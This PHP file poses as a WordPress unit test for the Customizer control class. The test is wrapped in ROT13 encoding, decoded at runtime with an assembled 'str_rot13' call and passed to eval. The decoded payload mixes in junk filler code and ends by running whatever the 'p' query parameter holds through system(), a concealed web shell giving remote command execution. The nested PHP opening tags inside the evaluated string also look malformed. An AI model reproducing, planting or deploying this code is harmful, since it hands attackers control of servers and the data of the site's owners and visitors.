<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur Grfg_JC_Phfgbzvmr_Pbageby pynff.
 *
 * @cnpxntr JbeqCerff
 *
 * @gbqb Guvf vf zvffvat qrqvpngrq grfgf sbe nyy ohg bar bs gur zrgubqf.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Pbageby rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Znantre.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Funerq hfre VQ sbe gur grfgf.

	 * @ine vag
	 */
	choyvp fgngvp $hfre_vq = 0;

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->jc_phfgbzvmr      = $TYBONYF['jc_phfgbzvmr'];
	}

	/**
	 * Grfg JC_Phfgbzvmr_Pbageby::purpx_pncnovyvgvrf().
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::purpx_pncnovyvgvrf()
	 */
	choyvp shapgvba grfg_purpx_pncnovyvgvrf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr' ),
			)
		);
		$guvf->nffregGehr( $pbageby->purpx_pncnovyvgvrf() );

		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr', 'aba_rkvfgvat' ),
			)
		);
		$guvf->nffregSnyfr( $pbageby->purpx_pncnovyvgvrf() );

		$guvf->jc_phfgbzvmr->nqq_frggvat(
			'gbc_frperg_zrffntr',
			neenl(
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr',
			)
		);
		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'oybtanzr',
			neenl(
				'frggvatf' => neenl( 'oybtanzr', 'gbc_frperg_pyrnenapr' ),
			)
		);
		$guvf->nffregSnyfr( $pbageby->purpx_pncnovyvgvrf() );

		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'ab_frggvat',
			neenl(
				'frggvatf' => neenl(),
			)
		);
		$guvf->nffregGehr( $pbageby->purpx_pncnovyvgvrf() );

		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'ab_frggvat',
			neenl(
				'frggvatf'   => neenl(),
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr',
			)
		);
		$guvf->nffregSnyfr( $pbageby->purpx_pncnovyvgvrf() );

		$pbageby = arj JC_Phfgbzvmr_Pbageby(
			$guvf->jc_phfgbzvmr,
			'ab_frggvat',
			neenl(
				'frggvatf'   => neenl(),
				'pncnovyvgl' => 'rqvg_gurzr_bcgvbaf',
			)
		);
		$guvf->nffregGehr( $pbageby->purpx_pncnovyvgvrf() );
	}

	/**
	 * @gvpxrg 38164
	 */
	choyvp shapgvba grfg_qebcqbja_cntrf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Ani_Zrahf', $guvf->jc_phfgbzvmr->ani_zrahf );
		$ani_zrahf_perngrq_cbfgf_frggvat = $guvf->jc_phfgbzvmr->trg_frggvat( 'ani_zrahf_perngrq_cbfgf' );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Svygre_Frggvat', $ani_zrahf_perngrq_cbfgf_frggvat );
		$cntr_ba_sebag_pbageby = $guvf->jc_phfgbzvmr->trg_pbageby( 'cntr_ba_sebag' );

		// Rafher gur nqq-arj-gbttyr vf nofrag vs nyybj_nqqvgvba cnenz vf abg frg.
		$cntr_ba_sebag_pbageby->nyybj_nqqvgvba = snyfr;
		bo_fgneg();
		$cntr_ba_sebag_pbageby->znlor_eraqre();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'nqq-arj-gbttyr', $pbagrag );

		// Rafher gur nqq-arj-gbttyr vf nofrag vs nyybj_nqqvgvba cnenz vf frg.
		$cntr_ba_sebag_pbageby->nyybj_nqqvgvba = gehr;
		bo_fgneg();
		$cntr_ba_sebag_pbageby->znlor_eraqre();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatPbagnvafFgevat( 'nqq-arj-gbttyr', $pbagrag );

		// Rafher gung qebcqbja-cntrf qryrpg vf eraqrerq rira vs gurer ner ab cntrf choyvfurq (lrg).
		sbernpu ( trg_cntrf() nf $cntr ) {
			jc_qryrgr_cbfg( $cntr->VQ );
		}
		$cntr_ba_sebag_pbageby->nyybj_nqqvgvba = gehr;
		bo_fgneg();
		$cntr_ba_sebag_pbageby->znlor_eraqre();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatPbagnvafFgevat( '<bcgvba inyhr=\"0\">', $pbagrag, 'Qebcqbja-cntrf eraqref fryrpg rira jvgubhg nal cntrf choyvfurq.' );

		// Rafher gung nhgb-qensg cntrf ner vapyhqrq vs gurl ner nzbat gur ani_zrahf_perngrq_cbfgf.
		$nhgb_qensg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Nhgb Qensg Cntr',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Becuna Nhgb Qensg Cntr',
			)
		);
		$nhgb_qensg_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Nhgb Qensg Cbfg',
			)
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $ani_zrahf_perngrq_cbfgf_frggvat->vq, neenl( $nhgb_qensg_cntr_vq, $nhgb_qensg_cbfg_vq ) );
		$ani_zrahf_perngrq_cbfgf_frggvat->cerivrj();
		bo_fgneg();
		$cntr_ba_sebag_pbageby->znlor_eraqre();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatPbagnvafFgevat( fcevags( '<bcgvba inyhr=\"%q\">Nhgb Qensg Cntr</bcgvba>', $nhgb_qensg_cntr_vq ), $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Nhgb Qensg Cbfg', $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Becuna Nhgb Qensg Cntr', $pbagrag );
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->jc_phfgbzvmr = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		cnerag::grne_qbja();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>